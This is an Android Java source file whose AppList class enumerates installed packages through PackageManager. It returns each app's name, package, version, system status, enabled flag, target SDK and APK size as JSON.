package com.fason.app.features.apps;

import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;

import com.fason.app.core.FasonApp;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.util.List;

// Installed apps manager
public final class AppList {

    private AppList() {}

    // Get installed apps list
    public static JSONObject get(boolean includeSystem) {
        JSONObject result = new JSONObject();
        JSONArray apps = new JSONArray();

        try {
            result.put("apps", apps);

            PackageManager pm = FasonApp.getContext().getPackageManager();
            List<PackageInfo> packages = pm.getInstalledPackages(PackageManager.GET_META_DATA);

            for (PackageInfo pkg : packages) {
                try {
                    ApplicationInfo info = pkg.applicationInfo;
                    boolean isSystem = (info.flags & ApplicationInfo.FLAG_SYSTEM) != 0;

                    if (!includeSystem && isSystem) continue;

                    JSONObject app = new JSONObject();
                    app.put("appName", info.loadLabel(pm).toString());
                    app.put("packageName", pkg.packageName);
                    app.put("versionName", pkg.versionName != null ? pkg.versionName : "");

                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        app.put("versionCode", pkg.getLongVersionCode());
                    } else {
                        app.put("versionCode", pkg.versionCode);
                    }

                    app.put("isSystem", isSystem);
                    app.put("enabled", info.enabled);
                    app.put("targetSdkVersion", info.targetSdkVersion);

                    // Get app size
                    try {
                        String src = info.sourceDir;
                        if (src != null) {
                            File f = new File(src);
                            app.put("size", f.length());
                        }
                    } catch (Exception ignored) {}

                    apps.put(app);
                } catch (Exception ignored) {}
            }

            result.put("total", apps.length());
        } catch (Exception e) {
            try { result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }

        return result;
    }

    // Legacy method
    public static JSONObject getInstalledApps(boolean includeSystem) {
        return get(includeSystem);
    }
}
